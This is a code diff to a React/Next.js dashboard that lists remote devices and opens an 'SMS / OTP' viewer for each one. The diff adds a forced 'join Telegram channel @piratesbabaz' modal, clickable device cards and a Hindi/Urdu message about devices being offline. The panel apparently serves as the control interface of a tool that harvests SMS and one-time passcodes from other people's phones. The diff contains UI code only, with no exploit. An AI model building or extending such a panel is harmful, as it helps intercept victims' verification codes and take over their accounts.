@@ -4,6 +4,9 @@ import { useRouter } from "next/navigation";
 
 const LS_ACCOUNTS = "ab_accounts";
 const LS_ACTIVE = "ab_active";
+const LS_JOINED = "ab_tg_joined";
+const CHANNEL_LINK = "https://t.me/piratesbabaz";
+const CHANNEL_NAME = "@piratesbabaz";
 
 function uid() {
   return Math.random().toString(36).slice(2, 10);
@@ -26,6 +29,7 @@ export default function Dashboard() {
   const [smsOpen, setSmsOpen] = useState(null);
   const [messages, setMessages] = useState([]);
   const [smsFilter, setSmsFilter] = useState("");
+  const [showJoin, setShowJoin] = useState(false);
 
   const active = accounts.find((a) => a.id === activeId) || null;
 
@@ -35,7 +39,10 @@ export default function Dashboard() {
       setAccounts(acc);
       const act = localStorage.getItem(LS_ACTIVE) || (acc[0] && acc[0].id) || "";
       setActiveId(act);
-    } catch {}
+      if (localStorage.getItem(LS_JOINED) !== "1") setShowJoin(true);
+    } catch {
+      if (localStorage.getItem(LS_JOINED) !== "1") setShowJoin(true);
+    }
   }, []);
 
   useEffect(() => {
@@ -230,13 +237,13 @@ export default function Dashboard() {
 
       <div className="grid">
         {filtered.map((d) => (
-          <div className="card" key={d.id}>
+          <div className="card" key={d.id} onClick={() => openSms(d)} style={{ cursor: "pointer" }}>
             <div className="head">
               <div>
                 <div className="id">{d.name || d.id}</div>
                 <div className="sub">{d.id}</div>
               </div>
-              <button className="btn" onClick={() => openSms(d)}>SMS</button>
+              <button className="btn" onClick={(e) => { e.stopPropagation(); openSms(d); }}>SMS</button>
             </div>
             <div className="meta">
               <div>
@@ -309,7 +316,7 @@ export default function Dashboard() {
           <div className="modal" onClick={(e) => e.stopPropagation()}>
             <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
               <div>
-                <h3 style={{ margin: 0 }}>SMS · {smsOpen.phone || smsOpen.id}</h3>
+                <h3 style={{ margin: 0 }}>SMS / OTP · {smsOpen.phone || smsOpen.id}</h3>
                 <div style={{ color: "var(--muted)", fontSize: 12 }}>{smsOpen.id}</div>
               </div>
               <button className="btn ghost" onClick={() => setSmsOpen(null)}>Close</button>
@@ -321,7 +328,7 @@ export default function Dashboard() {
               onChange={(e) => setSmsFilter(e.target.value)}
             />
             {smsLoading && <div className="empty">Loading SMS...</div>}
-            {!smsLoading && smsFiltered.length === 0 && <div className="empty">No SMS found</div>}
+            {!smsLoading && smsFiltered.length === 0 && <div className="empty">Is device pe SMS nahi mili.\nPath check / device offline ho sakta hai.</div>}
             {smsFiltered.map((m) => (
               <div className="sms-row" key={m.key}>
                 <div className="s">{m.sender || "Unknown"} · {m.ts || m.key}</div>
@@ -332,6 +339,36 @@ export default function Dashboard() {
           </div>
         </div>
       )}
+      {showJoin && (
+        <div className="modal-bg">
+          <div className="modal" style={{ maxWidth: 420, textAlign: "center" }}>
+            <div className="brand" style={{ justifyContent: "center", marginBottom: 8 }}>
+              <div className="logo">PB</div>
+            </div>
+            <h3 style={{ margin: "8px 0" }}>Join Telegram Channel</h3>
+            <p style={{ color: "var(--muted)", marginTop: 0 }}>
+              Panel use karne se pehle channel join karo:
+              <br />
+              <b>{CHANNEL_NAME}</b>
+            </p>
+            <a className="btn primary" style={{ display: "inline-block", marginBottom: 10 }} href={CHANNEL_LINK} target="_blank" rel="noreferrer">
+              Join {CHANNEL_NAME}
+            </a>
+            <div>
+              <button
+                className="btn"
+                onClick={() => {
+                  localStorage.setItem(LS_JOINED, "1");
+                  setShowJoin(false);
+                }}
+              >
+                I Joined — Continue
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
     </div>
   );
 }
